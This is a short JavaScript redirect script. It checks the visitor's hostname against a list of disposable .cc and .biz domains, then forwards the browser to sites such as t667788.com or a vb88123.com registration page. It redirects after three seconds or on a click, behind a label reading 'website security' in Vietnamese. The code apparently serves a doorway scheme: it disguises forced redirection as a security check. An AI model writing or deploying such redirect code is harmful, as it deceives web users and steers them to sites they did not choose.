const isWaitClick = "false";
const urlLists = ["https://p886866.com", "https://p886866.com"];
const randNum = Math.floor(Math.random() * 2) + 1;
var next = urlLists[randNum - 1];
var hostname = window.location.hostname;
console.log(hostname);
if (hostname.indexOf("ft609.cc") > -1 || hostname.indexOf("ro396.cc") > -1 || hostname.indexOf("pt505.cc") > -1) {
  next = "https://vb88123.com/register";
}
const t667788Links = [
  "localhost",
  "37sju.cc",
  "5kk1w.cc",
  "7pm9a.cc",
  "d6xqm.cc",
  "hqixv.cc",
  "izhpd.biz",
  "mzfjb.biz",
  "r5pfj.biz",
  "vf1xf.biz",
  "zwupz.biz",
  "rc620.biz",
  "nk545.biz",
  "uo790.biz",
  "wt840.biz",
  "yl964.biz",
  "dp103.cc",
  "gf258.cc",
  "in319.cc",
  "dl154.cc",
  "me413.cc"
];
const is667788LH = t667788Links.some((link) => hostname.includes(link));

if (is667788LH) {
  next = "https://t667788.com/";
}

let timeoutId;
if (isWaitClick === "false") {
  timeoutId = setTimeout(() => {
    window.location = next;
  }, 3000);
}
const existsContent = "An ninh trang web";

const handleClick = () => {
  // show loading
  document.querySelector(".status .loader").style.display = "flex";
  if (timeoutId) {
    clearTimeout(timeoutId);
  }
  setTimeout(() => {
    window.location = next;
  }, 1000);
};
